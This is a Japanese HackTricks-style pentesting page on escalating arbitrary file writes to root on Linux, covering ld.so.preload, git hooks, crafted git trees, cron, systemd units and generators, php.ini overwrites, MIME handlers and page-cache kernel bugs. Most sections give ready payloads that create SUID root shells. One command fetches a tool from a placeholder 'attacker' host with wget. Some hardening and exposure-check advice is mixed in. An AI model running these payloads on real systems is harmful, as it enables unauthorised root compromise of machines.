# Rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` は、dynamic linkerが他の共有オブジェクトより先に読み込む共有オブジェクトのシステム全体のリストです。Secure-execution modeではpreloadingに追加の制限が適用されるため、`/tmp/pe.so`のようなライブラリパスは、あらゆる状況で使えるSUIDバイナリの手法ではありません。\
このファイルを作成または変更できる場合、ファイルを読み込むプロセスは、他の共有オブジェクトより先にリストされたライブラリを読み込み、そのプロセスのコンテキストでコードを実行できます。<sup>[[12]](#references)</sup>

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### 制約付きファイル書き込みとしてのOCR出力

保存するファイル名を呼び出し側が指定できるOCRサービスは、画像内で認識したテキストを**制約付きファイル書き込み**のプリミティブに変える可能性があります。保存されるバイト列は画像データではなく認識されたテキストなので、OCR出力に構文エラーがないか確認してください。許可された保存先がWeb実行可能で、`.php`ファイル名を許可している場合、そのテキストはリクエスト時に実行される可能性があります。MakeSenseでは、ローカルからアクセス可能なOCRアプリケーションがテキストを`/saved/`に保存し、rootで実行されるPHPサーバーが保存ファイルをrootとして実行しました。書き込み先はそのディレクトリ内に限られており、path traversalは確認されていません。<sup>[[37]](#references)</sup>

実行時に得られる権限は、OCRの書き込みプロセスの権限ではなく、**PHPを提供するプロセス**の権限です。保存先の実行マッピングと実行時のユーザーを確認してください。root権限のOCRライターと、非特権のWebサーバーが組み合わさっていても、PHPがrootとして実行されるわけではありません。<sup>[[37]](#references)</sup> 直接的な[Webルートへのアップロードパターン](../../pentesting-web/file-upload/)と比較してください。

### Git hooks

**Git hooks**は、commitやmergeなど、リポジトリ内のイベントで実行される実行可能なスクリプトです。**特権を持つスクリプトまたはユーザー**がこれらの操作を実行し、攻撃者が**`.git`フォルダーに書き込み可能**な場合、hookを**権限昇格**に利用できます。<sup>[[13]](#references)</sup>

たとえば、git repoの**`.git/hooks`**にスクリプトを**生成**すると、新しいcommitが作成されるたびに実行させることができます。

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### 特権付き Git tree export の path traversal

特権で動作する synchronizer は、checkout を避け、`git ls-tree` で攻撃者の影響を受けるリポジトリを列挙し、`git cat-file` で各 blob を読み取り、報告されたパス名を staging directory に結合して、自ら書き込む場合があります。`-c safe.directory=*`（所有者が異なるリポジトリに対する Git の保護機能を無効化）を指定し、書き込み先が許可された範囲内か確認しない場合、これは **synchronizer の権限での任意ファイル書き込み** につながります。絶対パスの tree entry 名を使うと、Python の `os.path.join(stage, name)` は `stage` を無視します。相対パスに `../` が含まれている場合は、ファイルシステムがパスを解決するときに指定先の外へ抜け出せます。アプリケーションは Git に checkout させず、tree の内容をそのまま書き出すため、checkout 時のパス名拒否機能では書き込み先を保護できません。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root service、timer、deployment agent、template importer、backup/restore job で、次のようなコードを探してください。<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

tree エントリは `<mode> SP <name> NUL <raw object ID>` としてエンコードされます。`git hash-object --literally` オプションを使うと、通常のパースや `git fsck` では拒否される可能性のあるオブジェクトデータを意図的に許可できるため、使い捨ての clone で、ファイル名が絶対パスの保存先を指定する tree を作成できます。この例では、cron ファイルの blob を作成し、細工した tree を commit で包んでから、ブランチをその commit に移動します。ただし、悪用には、特権ジョブが使用するリポジトリを更新する権限と、不正なオブジェクトを受け入れる Git server が必要です。<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening では、リポジトリの取り込みと最終的なファイルシステム操作の両方を対象にする必要があります:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` を、サービスが信頼する必要のある正確なリポジトリに置き換え、可能であれば root 権限なしでリポジトリを処理します。
- マテリアライズ前に、絶対パス名と `.` または `..` の各要素を拒否します。結合後に正規化し、宛先が意図したルート配下にあることを確認します。
- 確認後に開く方式で発生する symlink race を避けます。信頼できるディレクトリのファイルディスクリプタを基準に相対パスで開き、Linux では攻撃者が制御するパスに対して `RESOLVE_BENEATH` と `RESOLVE_NO_SYMLINKS` を指定した `openat2()` を使用します。
- plumbing の出力から checkout を再実装するのではなく、隔離されたディレクトリで通常の checkout を行います。raw-object の取り込みが必要な場合は、`receive.fsckObjects=true` などの receive-side validation を有効にします。細工された tree を拒否するために必要な、パス名に関する `receive.fsck.*` の検出結果を無効化しないでください。

### 特権設定のデプロイ

一部の管理サービスは、意図するシステム状態を設定ファイルに保存し、後から昇格した権限でデプロイします。たとえば、[openmediavault は設定を `/etc/openmediavault/config.xml` に保存します](https://docs.openmediavault.org/en/7.x/faq.html)。また、その [RPC インターフェース](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html)からサービスの変更を適用できます。権限の低いアカウントがこのファイルを書き換えたり置き換えたりできる場合、認可されたデプロイを要求できるか、また選択されたモジュールが変更されたフィールドを root として使用するかを確認します。SSH アカウントキー、スケジュールされたコマンド、パッケージのインストールでは、それぞれ必要な前提条件が異なります。ファイルが存在することや XML ファイルが書き込み可能であることだけでは、いずれも実証できません。ファイルと親ディレクトリの権限、呼び出し元のグループと RPC 認可、インストール済みバージョン、実際の利用側を確認してください。列挙中に設定を編集したり、適用操作を実行したりしないでください。

`/etc/fail2ban/action.d/` の Fail2Ban アクション定義も、特権設定の境界です。このディレクトリへの書き込みと検索が可能なユーザーは、アクション定義を置き換えたり、override を追加したりできる可能性があります。ただし、ディレクトリ権限だけではコード実行は立証されません。有効な jail が実際に該当するアクションを選択すること、Fail2Ban サービスがより高い権限でそれを実行すること、認可された reload/restart の後に該当する ban event が発生することを確認します。Fail2Ban を再起動する無関係な sudo 権限は、正確なサービス呼び出しに適用され、変更した定義が読み込まれる場合に限り関係します。[Fail2Ban のアクション設定](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5)には、アクションディレクトリと jail の関係が記載されています。[サンプルアクション](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf)では、`actionban` が ban 時にサービスユーザーの権限で実行されることが示されています。列挙中は、アクションを変更したり ban を発生させたりせず、権限と有効な設定を確認してください。

WHOIS で情報を補完する mail action を有効な Fail2Ban jail が使用する場合は、別の境界が存在します。[CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) では、信頼できない WHOIS テキストが GNU mailutils の `mail` にパイプされ、その escape 処理によってコマンドが実行される可能性がありました。権限の低いファイル書き込みユーザーが、**選択されている WHOIS client** のサーバー上書き設定を変更できる場合、応答に影響を与えられる可能性があります。[Debian の `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html)にはそのようなファイルの一例が記載されていますが、パスと使用方法はインストール環境によって異なります。有効な jail/action、サービスの実行ユーザー、実際の WHOIS client と設定ファイルのパス、mail の実装、応答を制御できるか、インストール済みのベンダー修正または backport を確認してください。WHOIS 設定ファイルが書き込み可能であること、Fail2Ban のバージョン、mail action の存在だけでは、この一連の条件は立証されません。受動的な列挙中に外部サーバーへ問い合わせたり、ban を発生させたりしないでください。

### TFTP によるファイル作成と特権パッケージフック

アクセス可能な TFTP サービスは、tftpd-hpa の**有効な**設定で root として実行され、ファイルシステムのルートを `--secure` ディレクトリとして公開し、`--create` を有効にしている場合、コンテナまたはローカルユーザーとの境界を越える可能性があります。[tftpd-hpa のマニュアル](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html)には、作成とユーザーに関するオプションが記載されています。これは、`/etc/apt/apt.conf.d/` などの特権設定ディレクトリに新しいファイルを作成する手段になり得ます。ただし、既存ファイルの置き換えは拒否される場合があります。[APT の設定マニュアル](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)には、`APT::Update::Pre-Invoke` コマンドが記載されています。root で実行される `apt update` がより高い権限での利用側となるのは、新しい設定ファイルが読み込まれる場合に限られます。実行中の daemon の実際の引数と実行ユーザー、ネットワーク到達性とフィルタリング、対象ディレクトリの作成ポリシー、APT の有効な設定スコープ、その後に特権で実行されるコマンドを確認してください。デフォルトのファイル、書き込み可能な対象ディレクトリ、またはスケジュールされた APT コマンドだけでは、一連の経路全体は立証されません。受動的なトリアージでは、ファイルのアップロードや APT の実行を行わず、ローカル設定とメタデータを範囲を限定して読み取ってください。

### Cron と時刻関連ファイル

root が実行する cron 関連ファイルに**書き込み可能**であれば、そのジョブの次回実行時にコード実行できることがほとんどです。注目すべき対象は次のとおりです:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にある root 自身の crontab
- `systemd` timers と、それらが起動するサービス

簡易チェック:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

典型的な悪用経路:

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追加する**
- `run-parts` によってすでに実行されているスクリプトを **置き換える**
- 起動するスクリプトまたはバイナリを変更して **既存の timer target にバックドアを仕込む**

cron payload の最小例:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを配置します。

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` は通常、ファイル名にドットが含まれるファイルを無視するため、`backup.sh` ではなく `backup` のような名前を使ってください。<sup>[[15]](#references)</sup>
- システムによっては従来の cron の代わりに `systemd` timer を使いますが、悪用の考え方は同じです。**後で root が実行するものを変更する**ことです。<sup>[[20]](#references)</sup>

### Service & Socket files

**`systemd` unit files**、またはそれらが参照するファイルに書き込める場合、unit を reload して restart するか、service/socket activation の経路が実行されるのを待つことで、root として code execution を得られる可能性があります。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

system unit ディレクトリ自体への書き込み権限と検索権限も、ACL を含めて確認してください。ディレクトリの読み取りや一覧表示が拒否されていても、ユーザーが `/etc/systemd/system` に新しい unit を作成できる場合があります。ただし、そのパスに書き込めるだけでは何も起動しません。system manager が新しい unit を読み込むこと、その名前に対して呼び出し元に実効的な root 権限での `systemctl start` または `restart` の許可（あるいは別の特権 activation 経路）があること、そして service が意図した identity で実行されることを確認してください。ディスク上で変更した既存のロード済み unit には `daemon-reload` が必要な場合があります。新しい名前の unit は読み込み時の動作が異なります。ワイルドカードの restart ルールだけで十分と判断する前に、sudo の引数と除外条件を正確に確認してください。[systemd unit search path](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) と [systemctl loading and reload semantics](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) を参照してください。

興味深い対象には、次のものがあります。

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` で参照される service scripts/binaries
- root service が読み込む、書き込み可能な `EnvironmentFile=` のパス

簡易チェック:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

一般的な悪用経路:

- root 所有で、自分が変更できる service unit の **`ExecStart=` を上書きする**
- 悪意のある `ExecStart=` を含む **drop-in override を追加**し、先に古い設定をクリアする
- unit がすでに参照している **script/binary にバックドアを仕込む**
- socket が接続を受け取ったときに起動する対応する `.service` ファイルを変更し、**socket-activated service を乗っ取る**

悪意のある override の例:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

一般的な有効化フロー：

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

自分でサービスを再起動できなくても、socket-activated unitを編集できる場合は、クライアントからの接続を待つだけで、バックドア化したサービスをrootとして実行させられることがあります。<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators**は、起動時および設定の再読み込み時に、unitファイルを読み込む前にsystem managerによって起動される実行ファイルです。そのため、system-generator directory（または既存の実行可能なgenerator）への書き込み権限は、監査で`*.service`ファイルと`*.timer`ファイルだけを確認していると見落としやすい、rootコード実行に直結する手段です。<sup>[[35]](#references)[[36]](#references)</sup>

通常の検索順序は、`/run/systemd/system-generators/`、`/etc/systemd/system-generators/`、`/usr/local/lib/systemd/system-generators/`、`/usr/lib/systemd/system-generators/`です（一部のdistributionでは、`/usr`統合により`/lib/systemd/system-generators/`が公開されています）。先に検索されるdirectoryに同名の実行ファイルがあると、後続のdirectoryにあるものは隠されます。これらの**入力実行ファイルdirectory**と、generatorが生成した一時的なunit出力を格納する`/run/systemd/generator`、`/run/systemd/generator.early`、`/run/systemd/generator.late`を混同しないでください。<sup>[[35]](#references)</sup>

簡単な確認方法:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

新しく作成した generator には、実行ビットを設定する必要があります。write primitive でバイト列は制御できても mode を制御できない場合は、すでに実行可能な generator を対象にします。通常、ファイルをその場で切り詰めてもメタデータは保持されます。ディレクトリ自体が書き込み可能なら、新しいエントリを作成して実行可能に設定します。<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload` を **system** manager に対して実行するには適切な認可が必要ですが、実行するとすべての system generator が再実行されます。それ以外の場合は、特権ユーザーによる reload、パッケージ操作、または reboot を待ちます。`~/.config/systemd/user-generators/` などの user-generator ディレクトリは user manager の下で実行され、それだけで root 権限が得られることはありません。<sup>[[35]](#references)</sup>

hardening と hunting では、最終的な mode bits だけでなくパスの各コンポーネントと ACL をすべて確認し、generator のハッシュとパッケージ所有者をベースライン化し、すべての system-generator 入力ディレクトリにおける作成、名前変更、内容変更、権限変更を検知するようにします。書き込みの監視が重要です。one-shot generator は実行後に自身を削除できる一方、`/run/systemd/generator*` 配下の生成済み unit ツリーは次回の reload 時に再構築されるためです。<sup>[[35]](#references)[[36]](#references)</sup>

### 特権 PHP sandbox が使用する制限付き `php.ini` を上書きする

一部のカスタム daemon は、**制限付き `php.ini`**（例: `disable_functions=exec,system,...`）を指定して `php` を実行し、ユーザーが指定した PHP を検証します。sandbox 内のコードに **何らかの書き込みプリミティブ**（`file_put_contents` など）が残っており、daemon が使用する **正確な `php.ini` のパス**にアクセスできる場合、その **config を上書き**して制限を解除し、その後、昇格した権限で実行される 2 つ目の payload を送信できます。<sup>[[2]](#references)</sup>

一般的な流れ:

1. 1 つ目の payload で sandbox の config を上書きする。
2. 危険な関数が再び有効になった状態で、2 つ目の payload がコードを実行する。

最小限の例（daemon が使用するパスに置き換えてください）:

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

daemonがrootとして実行される（またはroot所有のパスを使って検証する）場合、2回目の実行ではrootコンテキストが得られます。これは、sandbox化されたruntimeからファイルへの書き込みが可能な場合に、**config overwriteによる権限昇格**を実現するものです。

### binfmt_misc

`binfmt_misc`は`/proc/sys/fs/binfmt_misc`配下に登録情報を公開します。各登録情報は、ファイル形式のパターンとinterpreterを関連付けます。権限への影響は、誰が登録情報を変更できるか、また後にどのプロセスが一致するファイルを実行するかによって異なるため、権限昇格の経路として扱う前に、これらの要件を確認してください。<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE`を持つ実行可能なhelperが、呼び出し元が制御するデータを受け取り、それを`/proc/sys/fs/binfmt_misc/register`に書き込む場合、呼び出し元がそのノードに直接書き込めなくても、別の登録経路になり得ます。列挙中に実行せず、helperの入力処理と書き込み動作を確認してください。登録ルールで`C`フラグが使われている場合、interpreterは一致したバイナリに基づく資格情報を受け取ります。そのため、root所有のSUIDファイルに一致すると、呼び出し元が制御するinterpreterがrootとして実行される可能性があります。`binfmt_misc`のmountと登録ポリシー、helperの有効なcapability、正確なルールとinterpreterのパス、実行可能なSUIDターゲット、そして`no_new_privs`または`nosuid` mountによってSUIDへの移行が抑止されるかを確認してください。capabilityビットや埋め込みパス文字列だけでは、調査の手掛かりにすぎません。<sup>[[21]](#references)</sup> SUIDが抑止される条件については、[execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)を参照してください。

### 上書き可能なscheme handler（http:やhttps:など）

デスクトップ環境は、MIME associationとdesktop entryを使ってURI schemeに対応するアプリケーションを選択します。該当するユーザー単位の設定ディレクトリとdesktop entryディレクトリに書き込める攻撃者は、それらのschemeを自身が制御するlauncherにリダイレクトできます。`$HOME/.config/mimeapps.list`ファイルを変更して、HTTPおよびHTTPSのURL handlerを悪意のあるファイルに割り当てると（例：`x-scheme-handler/http=evil.desktop`および`x-scheme-handler/https=evil.desktop`）、ユーザーがクリックした際にそのdesktop entryを実行できます。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### root 権限でユーザーが書き込み可能なスクリプト/バイナリを実行する

特権ワークフローが `/bin/sh /home/username/.../script` のように実行する場合（または非特権ユーザーが所有するディレクトリ内のバイナリを実行する場合）、その実行を乗っ取れます:<sup>[[1]](#references)</sup>

- **実行を検出する:** pspy でプロセスを監視し、root がユーザー制御のパスを呼び出すのを検知します。<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **書き込み可能か確認:** 対象ファイルとそのディレクトリが、自分のユーザーの所有であり、書き込み可能であることを確認します。
- **対象を乗っ取る:** 元のバイナリ／スクリプトをバックアップし、SUID shell を作成する payload（またはその他の root 権限での処理）を仕込んでから、権限を元に戻します。

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **特権アクションをトリガーする**（例: helper を起動する UI ボタンを押す）。root が乗っ取ったパスを再実行したら、`./rootshell -p` で昇格した shell を取得する。

### 特権バイナリのページキャッシュのみを書き換える

一部の kernel bug は、ファイルを**ディスク上で**変更しません。代わりに、読み取り可能なファイルの**ページキャッシュ上のコピー**のみを書き換えられます。**setuid** または root によって実行されるバイナリを標的にできれば、次の実行時にメモリ上の攻撃者が制御するバイト列が実行され、ディスク上のファイルハッシュが変わらないまま権限を昇格できる可能性があります。<sup>[[3]](#references)[[4]](#references)</sup>

これは**実行時のみのファイル書き込み primitive**として捉えると分かりやすいでしょう。<sup>[[3]](#references)</sup>

- **ディスクはクリーンなまま**: inode とディスク上のバイト列は変更されない
- **メモリは汚染される**: キャッシュされたページを読み取る、または実行するプロセスには、攻撃者が変更した内容が渡される
- **効果は一時的**: 再起動またはキャッシュの追い出し後に変更は消える

この primitive は、従来の**任意ファイル書き込み**と、Dirty COW / Dirty Pipe などの古い**ページキャッシュ悪用**の中間に位置します。<sup>[[3]](#references)</sup>

- Dirty COW は race に依存していた
- Dirty Pipe には書き込み位置の制約があった
- 脆弱な経路からキャッシュされたファイルバックのページに直接書き込める場合、ページキャッシュのみの primitive の方が信頼性が高い

#### 一般的な privesc の流れ

1. **ファイルバックのページキャッシュページ**に書き込める kernel primitive を得る
2. それを**読み取り可能な特権バイナリ**または root が実行する別のファイルに対して使う
3. ページがキャッシュから追い出される**前に**実行をトリガーする
4. ディスク上のファイルが変更されていないように見える状態で、root としてコードを実行する

一般的に価値の高い標的:

- **setuid-root** バイナリ
- **root サービス**が起動する helper
- **ホストの kernel/page cache を共有する container**から頻繁に実行されるバイナリ

#### AF_ALG + `splice()` の例

Copy Fail (CVE-2026-31431) は、この種の脆弱性の良い例です。脆弱な経路は Linux crypto userspace API (`AF_ALG` / `algif_aead`) にありました。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` は、読み取り可能なファイルのページキャッシュページへの参照を crypto TX scatterlist に移せる
- `algif_aead` の in-place decrypt 経路は、source と destination の buffer を再利用した
- その後 `authencesn` が destination の tag 領域に書き込んだ
- その領域が splice されたファイルバックのページを参照していると、書き込みは**標的ファイルのページキャッシュ**に行われた

注目すべき technique は CVE 自体ではなく、次のパターンです:

- **ファイルバックのキャッシュページを kernel subsystem に渡す**
- subsystem に、それらを**書き込み可能な出力として扱わせる**
- メモリ上で小さな制御された上書きをトリガーする

公開された PoC は、メモリ上の `/usr/bin/su` を patch するために**4-byte の書き込み**を繰り返し、その後実行しました。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone の例

DirtyClone (CVE-2026-43503) は、同じ**ページキャッシュのみを使った write-to-root**パターンの別の亜種を示しています。ただし今回は、sink は `AF_ALG` ではなく**IPsec ESP decrypt**です。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要な technique は**metadata laundering の手順**です:

- `splice()` が**読み取り専用のファイルバックのページキャッシュページ**を ESP-in-UDP packet に配置する
- 元の DirtyFrag mitigation は、その skb に `SKBFL_SHARED_FRAG` を設定し、`esp_input()` が**decrypt 前にコピーする**ようにしていた
- netfilter `TEE` は `nf_dup_ipv4()` -> `__pskb_copy_fclone()` を通じて packet を複製する
- clone は**同じ物理ページキャッシュ参照**を保持する一方で、`SKBFL_SHARED_FRAG` は失われる
- その後 `esp_input()` は clone を安全なものとして扱い、ファイルバックのページ上で**in-place の `cbc(aes)` decrypt**を実行する

したがって、reviewer が得るべき教訓は CVE より広範です。操作前にコピーが必要かを判断するために**skb/page metadata**に依存する mitigation は、backing page を保持したまま metadata を破棄するあらゆる**clone/copy 経路**によって、書き込み primitive が気付かれないまま再び有効になる可能性があります。

典型的な exploit の流れ:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` を実行し、private network namespace 内で**`CAP_NET_ADMIN`**を取得する
2. loopback を有効にし、`mangle/OUTPUT` に **netfilter `TEE` rule** を設定する
3. `NETLINK_XFRM` 経由で **XFRM ESP transport SA** を設定する
4. SA の `seq_hi` field に標的の各 4-byte word を encode する（DirtyFrag の word-selection trick）
5. splice した ESP-in-UDP packet を送信し、**TEE clone**を `esp_input()` に到達させて**in-place**で decrypt する
6. `/usr/bin/su` または別の特権実行ファイルのページキャッシュ上のコピーに攻撃者が制御するコードが含まれるまで繰り返す

実運用上の影響は `AF_ALG` の例と同じです。ディスク上のファイルはクリーンなままですが、`execve()` が**変更されたページキャッシュのバイト列**を使い、root 権限を得られます。<sup>[[8]](#references)[[9]](#references)</sup>

この亜種の exposure を確認する方法:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

短期的な attack-surface の縮小も、ここでは経路ごとに異なります。`48f6a5356a33` を含む kernel にアップグレードすると clone path が修正され、`xt_TEE` の autoload をブロックすると**フラグのロンダリング手順**が取り除かれ、`esp4` / `esp6` をブロックすると**復号シンク**が取り除かれます。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 露出状況の調査

この種の bug を疑う場合、ディスクの整合性チェックだけに頼らないでください。次の点も確認してください。

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

以下の設定値は、ロード可能なインターフェースとカーネルに組み込まれたインターフェースを区別します。crypto のビルドルールでは、`CONFIG_CRYPTO_USER_API_AEAD` が `algif_aead` に対応付けられています。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` はモジュールとしてロード／アンロード可能
- `CONFIG_CRYPTO_USER_API_AEAD=y`: インターフェースはカーネルに組み込まれている
- setuid バイナリは有効な標的です。page cache のみを対象としたパッチで、ローカルの足がかりを root 権限に昇格させられる場合があるためです

#### `algif_aead` 経路の攻撃対象領域の縮小

脆弱なインターフェースがロード可能なモジュールによって提供されている場合:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

カーネルに組み込まれている場合、いくつかの報告では、以下の方法で init パスをブロックしたとされています:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

この種の緩和策は、ほかの kernel LPE でも覚えておく価値があります。exploit が特定のオプションインターフェースに依存している場合、そのインターフェースを無効化または blacklist に登録すれば、kernel を完全に upgrade できるようになる前でも exploit の経路を断てます。<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – ユーザーが書き込み可能な PaperCut ディレクトリにある、root 権限で実行されるスクリプトの乗っ取り](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 に関する Openwall oss-security の脆弱性開示](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable の修正: crypto: algif_aead - out-of-place での動作に戻す](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 のアドバイザリ](https://copy.fail/)
- [7] [Theori / Xint の技術解説](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone リポジトリ / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE の亜種 DirtyClone (CVE-2026-43503) の分析と exploit](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux の修正: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を保持する (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux の先行する緩和策: splice された UDP パケットに `SKBFL_SHARED_FRAG` を設定する (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian マニュアルページ](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
